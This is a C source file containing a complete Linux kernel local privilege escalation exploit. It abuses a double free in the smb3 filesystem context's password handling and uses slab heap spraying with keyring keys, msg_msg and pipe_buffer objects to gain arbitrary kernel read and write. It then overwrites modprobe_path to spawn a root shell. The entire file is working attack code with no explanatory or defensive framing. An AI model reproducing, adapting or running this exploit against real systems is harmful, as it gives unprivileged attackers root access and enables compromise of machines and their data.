#define _GNU_SOURCE
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>
#include <stdbool.h>
#include <stdarg.h>
#include <ctype.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <keyutils.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/resource.h>

#include <linux/mount.h>
#include <linux/vm_sockets.h>

#define errout(msg) do { perror("[-] " msg); exit(EXIT_FAILURE); } while(0)

#define RETRY_AGIAN     1

#define MASK            0xfffffffff0000000
#define PAGE_SIZE       4096
#define PAGE_SHIFT      12
#define PHYSICAL_ALIGN  0x200000

#define MODPROBE_SCRIPT "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"

#define KMALLOC_96      96
#define K96_OBJSPERSLAB         42
#define K96_CPUPARTIAL          120
#define K96_CC_FULL             ((K96_CPUPARTIAL+1)*K96_OBJSPERSLAB)
#define K96_CC_PRE              (K96_OBJSPERSLAB-1)
#define K96_CC_POST             (K96_OBJSPERSLAB+1)

#define KEYRING_TYPE_USER       "user"
#define UK_PAYLOAD_SZ           24
#define KEY96_SZ                (64+UK_PAYLOAD_SZ)
int pre_keys[0x1000];
int post_keys[0x1000];

#define MSGMSG_SZ       48 /* 0x30 */
#define MSGSEG_SZ       8
#define MSG_SPRAY       0x200
#define MSG_SZ          192
int msg_qids[0x1000];
int msgw_qids[0x1000];

#define PIPE_SPRAY      500
#define PIPEBUF_SZ      40
int pipe_fds[PIPE_SPRAY][2];

struct rcu_head {
        void *next;
        void *func;
};

struct user_key_payload {
        struct rcu_head rcu;
        unsigned short  datalen;
        char            *data[];
};

struct msg_buf { // struct msgbuf
        long m_type;
        char m_text[0];
};

struct list_head {
        struct list_head *next, *prev;
};

struct msg_msg {
        struct list_head m_list; 
        long m_type;
        size_t m_ts;
        uint64_t next;
        uint64_t security;
        uint8_t text[0];
};

struct pipe_buffer {
        struct page *page;
        unsigned int offset, len;
        uint64_t ops;
        unsigned int flags;
        unsigned long private;
};

void pin_on_cpu(int cpu)
{
        cpu_set_t cpu_set;
        CPU_ZERO(&cpu_set);
        CPU_SET(cpu, &cpu_set);
        if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
                errout("pin_on_cpu:sched_setaffinity");
        usleep(1000);
}

void write_file(const char *filename, const char *buf, size_t buflen,
		unsigned int flags)
{
	int fd;

	fd = open(filename, O_WRONLY | O_CREAT | flags, 0755);
	if (fd < 0)
                errout("write_file:open");

	if (write(fd, buf, buflen) != buflen)
                errout("write_file:write");

	close(fd);
}

void setup_sandbox()
{
        int uid = getuid();
        int gid = getuid();
        char uid_map[128];
	char gid_map[128];

	sprintf(uid_map, "0 %d 1\n", uid);
	sprintf(gid_map, "0 %d 1\n", gid);

        if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWIPC) < 0)
                errout("setup_sandbox:unshare()");

        write_file("/proc/self/setgroups", "deny", strlen("deny"), 0);
        write_file("/proc/self/uid_map", uid_map, strlen(uid_map), 0);
        write_file("/proc/self/gid_map", gid_map, strlen(gid_map), 0);
}

void init_fd_limit()
{
        struct rlimit max_files;
        getrlimit(RLIMIT_NOFILE, &max_files);
        // max_files.rlim_cur = max_files.rlim_max;
        max_files.rlim_cur = 4096;
        setrlimit(RLIMIT_NOFILE, &max_files);
}

void dump_bin(char *desc, void *addr, int len)
{
        uint64_t *buf64 = (uint64_t *)addr;
        uint8_t *buf8 = (uint8_t *)addr;

        if (desc != NULL)
                printf("[*] %s:\n", desc);
        for (int i = 0; i < len/8; i += 4) {
                printf("    %04x", i * 8);
                for (int j = 0; j < 4; j++) {
                        if (i + j < len / 8)
                                printf("  0x%016lx", buf64[i+j]);
                        else
                                printf("                    ");
                }
                printf("   ");
                for (int j = 0; j < 32 && j + i * 8 < len; j++)
                        printf("%c", isprint(buf8[i*8+j]) ? buf8[i*8+j]:'.');
                puts("");
        }
}

static bool is_kernel_base(unsigned char *addr)
{
        // get-sig kernel_runtime_1
        if (memcmp(addr+0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
            memcmp(addr+0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
                return true;
        
        // get-sig kernel_runtime_2
        if (memcmp(addr+0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
            memcmp(addr+0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
            memcmp(addr+0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
            memcmp(addr+0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
            memcmp(addr+0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
            memcmp(addr+0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
            memcmp(addr+0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
            memcmp(addr+0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
            memcmp(addr+0x6a, "\x48\xc7\xc6", 3) == 0 &&
            memcmp(addr+0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
            memcmp(addr+0x78, "\xff\xe0", 2) == 0)
                return true;
        
        return false;
}

bool check_modprobe(char *expected)
{
        char buf[32];

        int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
        if (fd < 0)
                errout("check_modprobe:open");
        if (read(fd, buf, 32) < 0)
                errout("check_modprobe:read");
        if (!strcmp(buf, expected)) {
                close(fd);
                return true;
        }
        close(fd);

        return false;
}

bool trigger_modprobe(int status_fd)
{
        char *argv = NULL;
        int fd = memfd_create("", MFD_CLOEXEC);
        int status = 0;

        pin_on_cpu(1);

        if (write(fd, "\xff\xff\xff\xff", 4) < 0)
                errout("trigger_modprobe:write");
        fexecve(fd, &argv, &argv);
        close(fd);

        if (read(status_fd, &status, 1) < 0)
                errout("trigger_modprobe:read");
        if (status)
                return true;

        pin_on_cpu(1);

        return false;
}

int alloc_key(int id, char *buff, size_t size)
{
        char desc[256] = { 0 };
        char *payload;
        int key;

        size -= sizeof(struct user_key_payload);
        sprintf(desc, "payload_%d", id);
        payload = buff ? buff : calloc(1, size);

        key = add_key(KEYRING_TYPE_USER, desc, payload, size,
                      KEY_SPEC_PROCESS_KEYRING);
        if (key < 0)
                errout("alloc_key:add_key");

        return key;
}

void read_key(int key, char *buf, int buflen)
{
        keyctl_read(key, buf, buflen);
}

void free_key(int key)
{
        keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING);
}

int init_msg_queue()
{
        return msgget(IPC_PRIVATE, 0666|IPC_CREAT);
}

int send_msg(int mqid, void *mbuf, size_t msz)
{
        return msgsnd(mqid, mbuf, msz, 0);
}

int rcv_msg(int mqid, void *mbuf, size_t msz, long mtype)
{
        return msgrcv(mqid, mbuf, msz, mtype, 0);
}

int peek_msg(int mqid, void *mbuf, size_t msz)
{
        return msgrcv(mqid, mbuf, msz, 0, MSG_COPY|IPC_NOWAIT);
}

void init_pipes()
{
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (pipe(pipe_fds[i]) < 0)
                        errout("init_pipes:pipe");
        }
}

void close_pipes(int except)
{
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == except) continue;
                close(pipe_fds[i][1]);
                close(pipe_fds[i][0]);
        }
}

void resize_pipebufs(int pfdw, int bufsz)
{

        if (fcntl(pfdw, F_SETPIPE_SZ, bufsz/PIPEBUF_SZ*PAGE_SIZE) < 0)
                errout("resize_pipebufs:fcntl");
}

int *init_vvs_fds(int cnt)
{
        int *socks = calloc(sizeof(int), cnt);

        for (int i = 0; i < cnt; i++) {
                if ((socks[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0)) < 0)
                        errout("init_vvs_fds:socket");
        }

        return socks;
}

void spray_vvsocks(int *socks, int cnt, int port)
{
        struct sockaddr_vm connect_addr = { 0 };
        connect_addr.svm_family = AF_VSOCK;
        connect_addr.svm_cid = VMADDR_CID_LOCAL;

        for (int i = 0; i < cnt; i++) {
                connect_addr.svm_port = ++port;
                connect(socks[i], (struct sockaddr *)&connect_addr,
                        sizeof(connect_addr));
        }
}

void free_vvsocks(int *socks, int cnt)
{
        for (int i = 0; i < cnt; i++)
                close(socks[i]);
}

int prepare_double_free(int size)
{
        int fd = syscall(SYS_fsopen, "smb3", 0);
        if (fd < 0)
                errout("prepare_double_free:fsopen");

        char password[256];
        memset(password, 0x1, size-1);
        password[size-1] = 0;
        if (syscall(SYS_fsconfig, fd, FSCONFIG_SET_STRING,
                    "password", password, 0) < 0) {
                errout("prepare_double_free:fsconfig");
        }

        return fd;
}

static inline void trigger_first_free(int fd)
{
        syscall(SYS_fsconfig, fd, FSCONFIG_SET_STRING, "max_credits", "19", 0);
}

static inline void trigger_second_free(int fd)
{
        close(fd);
}

void exploit()
{
        int *vvs_fds;
        int df_fd;
        int key_id = 0;
        int corrupted_key;
        char payload[32] = { 0 };
        char new_buffer[4096] = { 0 };
        char msg_buffer[4096] = { 0 };
        struct msg_buf *mbuf = (struct msg_buf *)msg_buffer;
        struct pipe_buffer info_pipe_buf, hijack_pipe_buf;
        struct pipe_buffer aaw_pbid1_buf, aaw_pbid2_buf, aaw_pbid3_buf;
        int orig_pbid = -1, victim_pbid = -1;
        int snd_orig_pbid = -1, snd_victim_pbid = -1;
        int trd_snd_pbid1 = -1, trd_snd_pbid2 = -1, trd_snd_pbid3 = -1;
        char pad_buf[0x1000] = { 0 };
        size_t vmemmap_base, kernel_base;
        char zero_buf[0x1000] = { 0 };
        char rw_buf[0x1000] = { 0 };
        uint64_t modprobe_page;
        uint64_t modprobe_off;

        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
        setvbuf(stderr, 0, 2, 0);
        int stdin_fd = dup(STDIN_FILENO);
        int stdout_fd = dup(STDOUT_FILENO);
        int modprobe_fd = memfd_create("", MFD_CLOEXEC);
        int status_fd = memfd_create("", 0);

retry:
        memset(msg_buffer, 0, sizeof(msg_buffer));
        init_pipes();
        for (int i = 0; i < MSG_SPRAY; i++) {
                msg_qids[i] = init_msg_queue();
                msgw_qids[i] = init_msg_queue();
        }

        puts("[*] Draining kmalloc-96...");
        vvs_fds = init_vvs_fds(1000);
        spray_vvsocks(vvs_fds, 1000, 1023);

        puts("[*] Spraying pre kmalloc-96 objs...");
        for (int i = 0; i < 50; i++)
                pre_keys[i] = alloc_key(key_id++, payload, KEY96_SZ);

        // Free and reclaim the slot
        df_fd = prepare_double_free(KMALLOC_96);
        sched_yield();
        trigger_first_free(df_fd);

        corrupted_key = alloc_key(key_id++, payload, KEY96_SZ);

        puts("[*] Spraying post kmalloc-96 objs...");
        for (int i = 0; i < 50; i++)
                post_keys[i] = alloc_key(key_id++, payload, KEY96_SZ);

        trigger_second_free(df_fd);

        puts("[*] Freeing pre/post kmalloc-96 objs around victim...");
        for (int i = 0; i < 50; i++)
                free_key(pre_keys[i]);
        for (int i = 0; i < 50; i++)
                free_key(post_keys[i]);
        sleep(1); // GC keys
        for (int i = 999; i >= 800; i--)
                close(vvs_fds[i]);
        sleep(1);

        puts("[*] Spraying cross-cache kmalloc-cg-192 msg_msg...");
        mbuf->m_type = 1;
        memset(mbuf->m_text, 'A', MSG_SZ);
        for (int i = 0; i < MSG_SPRAY; i++) {
                *(uint64_t *)(mbuf->m_text) = i;
                send_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ);
        }

        puts("[*] Freeing corrupted key...");
        free_key(corrupted_key);
        sleep(1);

        puts("[*] Spraying kmalloc-cg-192 pipe_buffers...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                resize_pipebufs(pipe_fds[i][1], 4*PIPEBUF_SZ);
        }
        /* page: 0x00, 0x40, 0x80, 0xc0 */
        puts("[*] Spraying pages to pipe_buffers...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                write(pipe_fds[i][1], "deadbeef", 8);
                write(pipe_fds[i][1], &i, sizeof(int));
                write(pipe_fds[i][1], &i, sizeof(int));
                write(pipe_fds[i][1], "deadbeef", 8);
                write(pipe_fds[i][1], "deadbeef", 8);
                write(pipe_fds[i][1], "deadbeef", 8);
        }

        puts("[*] Checking unaligned overlap...");
        int overlap_idx = -1;
        int at_start = 0;
        int bad_pipebuf = -1;
        for (int i = 0; i < MSG_SPRAY && (overlap_idx == -1 || at_start); i++) {
                memset(msg_buffer, 0, sizeof(msg_buffer));
                if (peek_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ) < 0)
                        errout("peek_msg");

                for (int j = 1; j < ((MSG_SZ-MSGMSG_SZ)/8); j++) {
                        uint64_t val = *(uint64_t *)(mbuf->m_text+j*8);
                        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                                dump_bin("Overlap data", mbuf->m_text, MSG_SZ-MSGMSG_SZ);
                                overlap_idx = *(uint64_t *)(mbuf->m_text);
                                // val += 0x40;
                                if ((val & 0xFF) == 0x00)
                                        val = (val & ~0xFF) | 0x40;
                                else
                                        val = (val & ~0xFF) | 0x00;
                                *(uint64_t *)(mbuf->m_text+j*8) = val;
                                memcpy(new_buffer, msg_buffer, sizeof(new_buffer));
                                at_start = 0;
                                break;
                        } else if (val == 0x0) {
                                dump_bin("Overlap data", mbuf->m_text, MSG_SZ-MSGMSG_SZ);
                                overlap_idx = i;
                                at_start = 1;
                                break;
                        }
                }
        }
        if (at_start) {
                printf("[-] Overlap at start (msg_msg idx: %d)\n", overlap_idx);
                goto not_found;
        }
        if (overlap_idx == -1) {
                puts("[-] Can not found the overlap");
                goto not_found;
        }
        printf("[*] Overlap msg_msg idx: %d\n", overlap_idx);

        puts("[*] Freeing overlap msg_msg...");
        if (rcv_msg(msg_qids[overlap_idx], mbuf, MSG_SZ-MSGMSG_SZ, 1) < 0)
                errout("rcv_msg"); 
        puts("[*] Spraying msg_msg to overwrite pipe_buffer...");
        memcpy(msg_buffer, new_buffer, sizeof(new_buffer));
        *(uint64_t *)(mbuf->m_text) = 0xdeadbeef;
        mbuf->m_type = 1;
        dump_bin("Overwrite data", mbuf->m_text, MSG_SZ-MSGMSG_SZ);
        for (int i = 0; i < 20; i++)
                send_msg(msgw_qids[i], mbuf, MSG_SZ-MSGMSG_SZ);

        for (int i = 0; i < PIPE_SPRAY; i++) {
                char tmp_buf[0x10]; 
                int idx;
                memset(tmp_buf, 0, sizeof(tmp_buf));
                read(pipe_fds[i][0], tmp_buf, 8);
                read(pipe_fds[i][0], &idx, sizeof(int));
                if (!strcmp(tmp_buf, "deadbeef") && idx != i) {
                        orig_pbid = idx;
                        victim_pbid = i;
                        // break;
                }
        }
        if (orig_pbid == -1)
                goto page_uaf_err;
        printf("[*] Got 1st corrupted pipe_buffers (orig: %d, victim: %d)\n",
               orig_pbid, victim_pbid);

        puts("[*] Padding pipe_buffers[victim] to 96*2...");
        memset(pad_buf, 0, sizeof(pad_buf));
        write(pipe_fds[victim_pbid][1], pad_buf, 96*2-40);
        puts("[*] Close pipe_buffers[orig] to free the page...");
        close(pipe_fds[orig_pbid][0]);
        close(pipe_fds[orig_pbid][1]);

        puts("[*] Spraying pipe_buffers (size: 2*40) on 1st victim page...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == orig_pbid || i == victim_pbid)
                        continue;
                // resize_pipebufs(pipe_fds[i][1], 96);
                resize_pipebufs(pipe_fds[i][1], 2*PIPEBUF_SZ);
        }
        read(pipe_fds[victim_pbid][0], pad_buf, 96-8-4);
        read(pipe_fds[victim_pbid][0], &info_pipe_buf, sizeof(info_pipe_buf));
        printf("[*] Got a pipe_buffer (page: %p, ops: %p)\n",
               info_pipe_buf.page, info_pipe_buf.ops);
        if ((uint64_t)info_pipe_buf.page < 0xffff000000000000 ||
            (uint64_t)info_pipe_buf.ops < 0xffffffff81000000)
            goto page_uaf_err;
        
        puts("[*] Trying to get 2nd victim page...");
        write(pipe_fds[victim_pbid][1], &info_pipe_buf, sizeof(info_pipe_buf));
        for (int i = 0; i < PIPE_SPRAY; i++) {
                int idx;
                if (i == orig_pbid || i == victim_pbid)
                        continue;
                read(pipe_fds[i][0], &idx, sizeof(int));
                if (idx < PIPE_SPRAY && idx != i) {
                        snd_orig_pbid = idx;
                        snd_victim_pbid = i;
                        break;
                }
        }
        if (snd_orig_pbid == -1)
                goto page_uaf_err;
        printf("[*] Got 2nd corrupted pipe_buffers (orig: %d, victim: %d)\n",
                snd_orig_pbid, snd_victim_pbid);

        memset(pad_buf, 0, sizeof(pad_buf));
        write(pipe_fds[snd_victim_pbid][1], pad_buf, 192-40);
        puts("[*] Close pipe_buffers[snd_orig] to free the page...");
        close(pipe_fds[snd_orig_pbid][0]);
        close(pipe_fds[snd_orig_pbid][1]);

        puts("[*] Spraying pipe_buffers (size: 4*40) on 2nd victim page...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == orig_pbid || i == victim_pbid ||
                    i == snd_orig_pbid || i == snd_victim_pbid) {
                        continue;
                }
                resize_pipebufs(pipe_fds[i][1], 4*PIPEBUF_SZ);
        }

        puts("[*] Hijacking 3rd pipe_buffer1.page to 2nd victim page...");
        hijack_pipe_buf.page = info_pipe_buf.page;
        hijack_pipe_buf.offset = 192;
        hijack_pipe_buf.len = 192;
        hijack_pipe_buf.ops = info_pipe_buf.ops;
        hijack_pipe_buf.flags = info_pipe_buf.flags;
        hijack_pipe_buf.private = info_pipe_buf.private;
        write(pipe_fds[snd_victim_pbid][1], &hijack_pipe_buf,
              sizeof(hijack_pipe_buf));

        puts("[*] Finding 3rd corrupted pipe_buffer1...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == orig_pbid || i == victim_pbid ||
                    i == snd_orig_pbid || i == snd_victim_pbid) {
                        continue;
                }

                struct page *page_ptr;
                read(pipe_fds[i][0], &page_ptr, sizeof(page_ptr));
                if (page_ptr == hijack_pipe_buf.page) {
                        trd_snd_pbid1 = i;
                        break;
                }
        }
        if (trd_snd_pbid1 == -1)
                goto page_uaf_err;
        printf("[*] Got 3rd corrupted pipe_buffer1 (pbid: %d)\n",
                trd_snd_pbid1);
        
        puts("[*] Hijacking 3rd pipe_buffer2.page to 2nd victim page...");
        hijack_pipe_buf.offset = 192;
        hijack_pipe_buf.len = 192;
        write(pipe_fds[snd_victim_pbid][1], &pad_buf, 192-sizeof(hijack_pipe_buf));
        write(pipe_fds[snd_victim_pbid][1], &hijack_pipe_buf,
              sizeof(hijack_pipe_buf));

        puts("[*] Finding 3rd corrupted pipe_buffer2...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == orig_pbid || i == victim_pbid ||
                    i == snd_orig_pbid || i == snd_victim_pbid ||
                    i == trd_snd_pbid1) {
                        continue;
                }

                struct page *page_ptr;
                read(pipe_fds[i][0], &page_ptr, sizeof(page_ptr));
                if (page_ptr == hijack_pipe_buf.page) {
                        trd_snd_pbid2 = i;
                        break;
                }
        }
        if (trd_snd_pbid2 == -1)
                goto page_uaf_err;
        printf("[*] Got 3rd corrupted pipe_buffer2 (pbid: %d)\n",
                trd_snd_pbid2);
        
        puts("[*] Hijacking 3rd pipe_buffer3.page to 2nd victim page...");
        hijack_pipe_buf.offset = 192;
        hijack_pipe_buf.len = 192;
        write(pipe_fds[snd_victim_pbid][1], &pad_buf, 192-sizeof(hijack_pipe_buf));
        write(pipe_fds[snd_victim_pbid][1], &hijack_pipe_buf,
                sizeof(hijack_pipe_buf));

        puts("[*] Finding 3rd corrupted pipe_buffer3...");
        for (int i = 0; i < PIPE_SPRAY; i++) {
                if (i == orig_pbid || i == victim_pbid ||
                    i == snd_orig_pbid || i == snd_victim_pbid ||
                    i == trd_snd_pbid1 || i == trd_snd_pbid2) {
                        continue;
                }

                struct page *page_ptr;
                read(pipe_fds[i][0], &page_ptr, sizeof(page_ptr));
                if (page_ptr == hijack_pipe_buf.page) {
                        trd_snd_pbid3 = i;
                        break;
                }
        }
        if (trd_snd_pbid3 == -1)
                goto page_uaf_err;
        printf("[*] Got 3rd corrupted pipe_buffer3 (pbid: %d)\n",
                trd_snd_pbid3);

        /*
         * Init:
         * - trd_pbid1: x
         * - trd_pbid2: Point to trd_pbid3
         * - trd_pbid3: x
         * 
         * Read/Write:
         * 1. Write to trd_pbid2 to modify trd_pbid3: Point to trd_pbid1
         * 2. trd_pbid1: R/W page
         * 3. trd_pbid2: Point to trd_pbid3 again
         * 4. trd_pbid3: x
         */
        puts("[*] Setting up kenrel arbitrary read/write...");
        memcpy(&aaw_pbid1_buf, &info_pipe_buf, sizeof(aaw_pbid1_buf));
        memcpy(&aaw_pbid2_buf, &info_pipe_buf, sizeof(aaw_pbid2_buf));
        memcpy(&aaw_pbid3_buf, &info_pipe_buf, sizeof(aaw_pbid3_buf));
        aaw_pbid1_buf.offset = 0;
        aaw_pbid1_buf.len = 0xff0;
        aaw_pbid2_buf.offset = 3 * 192;
        aaw_pbid2_buf.len = 0;
        aaw_pbid3_buf.offset = 192;
        aaw_pbid3_buf.len = 0;
        /* Modify trd_pbid2 (offset 192 + len 192)=192*2 */
        write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid2_buf, sizeof(aaw_pbid2_buf));
        
        puts("[*] Finding kernel base vmemmap offset...");
        vmemmap_base = (size_t) info_pipe_buf.page & MASK;
        for (uint64_t i = 0;; i++) {
                kernel_base = 0x40 * ((PHYSICAL_ALIGN * i) >> PAGE_SHIFT);
                struct page *page_to_read = (struct page *)
                                            (vmemmap_base+kernel_base);
                printf("\r[*] Trying page: 0x%lx (kernel_base: 0x%lx)",
                       page_to_read, kernel_base);

                aaw_pbid1_buf.offset = 0;
                aaw_pbid1_buf.len = 0x1ff8;
                aaw_pbid1_buf.page = page_to_read;
                write(pipe_fds[trd_snd_pbid2][1], &aaw_pbid3_buf,
                      sizeof(aaw_pbid3_buf));
                write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid1_buf,
                      sizeof(aaw_pbid1_buf));
                write(pipe_fds[trd_snd_pbid3][1], &zero_buf,
                      192-sizeof(aaw_pbid1_buf));
                write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid2_buf,
                      sizeof(aaw_pbid2_buf));
                read(pipe_fds[trd_snd_pbid1][0], rw_buf, 0xfff);

                if (is_kernel_base(rw_buf))
                        break;
        }
        printf("\n[*] Found kernel base vmemmap offset: 0x%lx\n", kernel_base);

        puts("[*] Scanning kernel memory...");
        for (uint64_t i = 0;; i++) {
                struct page *page_to_read = (struct page *)
                                            (vmemmap_base+kernel_base+i*0x40);
                if (!(i % 1000)) {
                        printf("\r[*] Scanning 0x%lx, %luMB",
                               page_to_read, i*4096/1024/1024);
                }

                memset(&rw_buf, 0, PAGE_SIZE);
                aaw_pbid1_buf.offset = 0;
                aaw_pbid1_buf.len = 0x1ff8;
                aaw_pbid1_buf.page = page_to_read;
                write(pipe_fds[trd_snd_pbid2][1], &aaw_pbid3_buf,
                      sizeof(aaw_pbid3_buf));
                write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid1_buf,
                      sizeof(aaw_pbid1_buf));
                write(pipe_fds[trd_snd_pbid3][1], &zero_buf,
                      192-sizeof(aaw_pbid1_buf));
                write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid2_buf,
                      sizeof(aaw_pbid2_buf));
                read(pipe_fds[trd_snd_pbid1][0], rw_buf, 0xfff);

                void *locate = (uint64_t *)memmem(&rw_buf, 0xfff,
                                                  "/sbin/modprobe",
                                                  sizeof("/sbin/modprobe"));
                if (locate) {
                        modprobe_page = (uint64_t)page_to_read;
                        modprobe_off = (uint8_t *)locate - (uint8_t *)rw_buf;
                        printf("\n[*] Found modprobe_path at page: 0x%lx (offset: 0x%lx)\n",
                             modprobe_page, modprobe_off);
                        break;
                }
        }

        char fd_path[32] = { 0 };
        for (int i = 0; i < 4194304; i++) {
                snprintf(fd_path, sizeof(fd_path), "/proc/%i/fd/%i",
                         i, modprobe_fd);
                lseek(modprobe_fd, 0, SEEK_SET);
                dprintf(modprobe_fd, MODPROBE_SCRIPT, i, status_fd,
                        i, stdin_fd, i, stdout_fd);

                aaw_pbid1_buf.offset = (unsigned int)modprobe_off;
                aaw_pbid1_buf.len = 0;
                aaw_pbid1_buf.page = (struct page *)modprobe_page;
                write(pipe_fds[trd_snd_pbid2][1], &aaw_pbid3_buf,
                      sizeof(aaw_pbid3_buf));
                write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid1_buf,
                      sizeof(aaw_pbid1_buf));
                write(pipe_fds[trd_snd_pbid3][1], &zero_buf,
                      192-sizeof(aaw_pbid1_buf));
                write(pipe_fds[trd_snd_pbid3][1], &aaw_pbid2_buf,
                      sizeof(aaw_pbid2_buf));
                write(pipe_fds[trd_snd_pbid1][1], fd_path, 32);

                if (check_modprobe(fd_path))
                        errout("check_modprobe");
                if (trigger_modprobe(status_fd)) {
                        puts("[+] Got root");
                        break;
                }
        }

        /*
         * #ifdef CONFIG_IPC_NS
         * msg_exit_ns
         *   free_ipcs
         *     freeque
         *       list_for_each_entry_safe(msg, t, &msq->q_messages, m_list)
         *         free_msg(msg); --> Crash
         */
        sleep(13371337);

        return;

page_uaf_err:
        puts("[-] Error in page UAF!");
        for (int i = 0; i < 20; i++)
                rcv_msg(msgw_qids[i], mbuf, MSG_SZ-MSGMSG_SZ, 1);
        goto release;
not_found:
        puts("[-] Not found unaligned overlap!");
        for (int i = 0; i < MSG_SPRAY; i++) {
                if (i == overlap_idx) continue;
                rcv_msg(msg_qids[i], mbuf, MSG_SZ-MSGMSG_SZ, 1);
        }
release:
        for (int i = 0; i < 800; i++) {
                close(vvs_fds[i]);
        }
        // close_pipes(-1);

        if (RETRY_AGIAN) {
                puts("[-] Waiting for retrying...");
                sleep(2);
                puts("[-] Retry again...");

                goto retry;
        }

        return;
}

// groupadd test && useradd -m -g test -s /bin/bash test && passwd test
int main()
{
        setup_sandbox();
        init_fd_limit();
        pin_on_cpu(0);

        exploit();
}
